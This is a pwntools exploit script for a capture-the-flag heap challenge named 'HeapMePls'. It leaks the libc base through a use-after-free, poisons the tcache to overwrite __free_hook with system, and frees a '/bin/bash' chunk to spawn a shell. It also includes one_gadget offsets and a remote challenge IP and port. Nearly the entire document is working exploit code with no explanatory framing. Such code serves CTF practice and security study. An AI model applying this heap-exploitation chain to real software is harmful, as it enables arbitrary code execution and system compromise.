from pwn import *

# --- Info ---
# CTF: DEKRA
# Date: -
# Challenge: HeapMePls
# Description: Simple tcache poisoning attack via Use-After-Free
# --- End Info ---

#context.log_level = 'debug'
context.terminal = ["tmux", "sp", "-h"]
context.endian = 'little'

PATH = './vuln'
LIBC = './libc-2.28.so'

ENV = {"LD_PRELOAD":"./libc-2.28.so"}
libc  = ELF(LIBC, checksec = False)
binary  = ELF(PATH, checksec = False)

REMOTE = 0

HOST = '168.119.247.237'
PORT = 5012

def add(n, name):
    r.recvuntil('>')
    r.sendline('1')
    r.recvuntil('items: ')
    r.sendline(str(int(n)))
    r.recvuntil('Name: ')
    r.sendline(name)

def edit(idx, n, name):
    r.recvuntil('>')
    r.sendline('4')
    r.recvuntil('index: ')
    r.sendline(str(int(idx)))
    r.recvuntil('items: ')
    r.sendline(str(int(n)))
    r.recvuntil('Name: ')
    r.sendline(name)

def show(idx):
    r.recvuntil('>')
    r.sendline('3')
    r.recvuntil('index: ')
    r.sendline(str(int(idx)))

def free(idx):
    r.recvuntil('>')
    r.sendline('2')
    r.recvuntil('index: ')
    r.sendline(str(int(idx)))
    
def pad(addr):
    return addr + b'\x00'*(8-len(addr))



context.binary = PATH
r = remote(HOST, PORT) if REMOTE else process(PATH, env=ENV)
#gdb.attach(r)
#pause()

add(1024, "AAAA") # 0
add(1024, "/bin/sh\x00") # 1

for _ in range(7):
    add(1024, "AAAA")

for i in range(7):
    free(i)


free(0) # 0

show(0)

leak = u64(pad(r.recvuntil('\n')[:-1]))

libc_base = leak - 0x3b0ca0

binsh = libc_base + 0x177b75

system = libc_base + libc.symbols['system'] #0x0000000000041b80

__free_hook = libc_base + libc.symbols['__free_hook']
__malloc_hook = libc_base + libc.symbols['__malloc_hook']

log.info(f'Leaked: libc base @ {hex(libc_base)}')
log.info(f'Leaked: system @ {hex(system)}')
log.info(f'Leaked: /bin/sh @ {hex(binsh)}')
log.info(f'Leaked: __free_hook @ {hex(__free_hook)}')
log.info(f'Leaked: __malloc_hook @ {hex(__malloc_hook)}')

add(0x80, "AAAA") # 9
add(0x80, "AAAA") # 10

free(9)
free(10)

'''
0x41a06 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x41a5a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xdfe81 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

'''

edit(10, 0x80, p64(__free_hook))

add(0x80, "AAAA")
add(0x80, p64(system))

add(0x10, "/bin/bash\x00") # 13

pause()

free(13)

r.interactive()
r.close()


